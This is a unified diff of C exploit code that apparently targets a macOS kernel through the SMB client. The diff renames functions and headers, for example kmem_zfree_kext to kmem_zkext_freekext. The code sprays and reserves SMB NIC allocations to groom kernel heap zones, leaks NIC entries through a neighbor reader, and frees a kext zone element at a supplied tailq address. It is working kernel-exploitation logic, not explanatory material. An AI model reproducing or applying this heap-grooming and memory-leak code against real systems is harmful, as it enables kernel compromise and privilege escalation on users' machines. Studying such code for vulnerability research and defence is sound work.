@@ -15,17 +15,17 @@
 #include "../smb/nic_allocator.h"
 #include "../smb/client.h"
 
-#include "zfree_kext.h"
+#include "zkext_free.h"
 #include "allocator_rw.h"
 #include "allocator_nic_parallel.h"
-#include "neighbor_reader.h"
+#include "zkext_neighbor_reader.h"
 #include "platform_constants.h"
 #include "util_binary.h"
 #include "util_misc.h"
 #include "util_dispatch.h"
 
 
-int kmem_zfree_kext_leak_nic(smb_nic_allocator allocator, kmem_neighour_reader_t neighbor_reader, const struct sockaddr_in* addr, struct complete_nic_info_entry* out) {
+int kmem_zkext_freekext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neighour_reader_t neighbor_reader, const struct sockaddr_in* addr, struct complete_nic_info_entry* out) {
     
     smb_nic_allocator gap_allocator = smb_nic_allocator_create(addr, sizeof(*addr));
     
@@ -66,7 +66,7 @@ int kmem_zfree_kext_leak_nic(smb_nic_allocator allocator, kmem_neighour_reader_t
     assert(error == 0);
     
     char data[96];
-    error = kmem_neighbor_reader_prepare_read_modified(neighbor_reader, data, sizeof(data));
+    error = kmem_zkext_neighbor_reader_prepare_read_modified(neighbor_reader, data, sizeof(data));
     if (error) {
         return error;
     }
@@ -81,7 +81,7 @@ int kmem_zfree_kext_leak_nic(smb_nic_allocator allocator, kmem_neighour_reader_t
 }
 
 
-void kmem_zfree_kext_allocate_sockets(smb_nic_allocator allocator, int nic_index, size_t count, uint8_t sin_len) {
+void kmem_zkext_freekext_allocate_sockets(smb_nic_allocator allocator, int nic_index, size_t count, uint8_t sin_len) {
     size_t done = 0;
     size_t max_batch_size = 1024;
     while (done < count) {
@@ -105,7 +105,7 @@ void kmem_zfree_kext_allocate_sockets(smb_nic_allocator allocator, int nic_index
 }
 
 
-void kmem_zfree_kext_reserve_nics(smb_nic_allocator allocator, size_t count) {
+void kmem_zkext_freekext_reserve_nics(smb_nic_allocator allocator, size_t count) {
     size_t done = 0;
     size_t max_batch_size = 1024;
     while (done < count) {
@@ -126,7 +126,7 @@ void kmem_zfree_kext_reserve_nics(smb_nic_allocator allocator, size_t count) {
 }
 
 
-void kmem_zfree_reserve_va(struct sockaddr_in* smb_addr) {
+void kmem_zkext_freereserve_va(struct sockaddr_in* smb_addr) {
     int num_reserved_pages = 70;
     int num_768_allocs = XE_PAGE_SIZE * num_reserved_pages / (768 * 2);
     int num_32_allocs = XE_PAGE_SIZE * num_reserved_pages / (32 * 2);
@@ -150,9 +150,9 @@ void kmem_zfree_reserve_va(struct sockaddr_in* smb_addr) {
 }
 
 
-int kmem_zfree_kext(struct sockaddr_in* smb_addr, uintptr_t tailq) {
-    kmem_neighour_reader_t neighbor_reader = kmem_neighbor_reader_create();
-    kmem_zfree_reserve_va(smb_addr);
+int kmem_zkext_freekext(struct sockaddr_in* smb_addr, uintptr_t tailq) {
+    kmem_zkext_neighour_reader_t neighbor_reader = kmem_neighbor_reader_create();
+    kmem_zkext_freereserve_va(smb_addr);
     
     smb_nic_allocator nic_allocator;
     kmem_allocator_rw_t temp_allocator = kmem_allocator_rw_create(smb_addr, XE_PAGE_SIZE * 70 / (768 * 2));
@@ -161,10 +161,10 @@ int kmem_zfree_kext(struct sockaddr_in* smb_addr, uintptr_t tailq) {
     int tries = 10;
     do {
         nic_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
-        int error = kmem_zfree_kext_leak_nic(nic_allocator, neighbor_reader, smb_addr, &entry);
+        int error = kmem_zkext_freekext_leak_nic(nic_allocator, neighbor_reader, smb_addr, &entry);
         if (error) {
             smb_nic_allocator_destroy(&nic_allocator);
-            kmem_neighbor_reader_reset(neighbor_reader);
+            kmem_zkext_neighbor_reader_reset(neighbor_reader);
         } else {
             break;
         }
@@ -192,10 +192,10 @@ int kmem_zfree_kext(struct sockaddr_in* smb_addr, uintptr_t tailq) {
     
     for (int i = 0; i < 100; i++) {
         printf("%d / 100\n", i);
-        kmem_zfree_kext_allocate_sockets(nic_allocator, INT32_MAX - i, 10000, sizeof(struct sockaddr_in));
+        kmem_zkext_freekext_allocate_sockets(nic_allocator, INT32_MAX - i, 10000, sizeof(struct sockaddr_in));
     }
 
-    kmem_zfree_kext_allocate_sockets(nic_allocator, (uint32_t)entry.nic_index, 512, 96);
+    kmem_zkext_freekext_allocate_sockets(nic_allocator, (uint32_t)entry.nic_index, 512, 96);
     
     kmem_allocator_nic_parallel_t capture_allocator = kmem_allocator_nic_parallel_create(smb_addr, 1024 * 500);
 
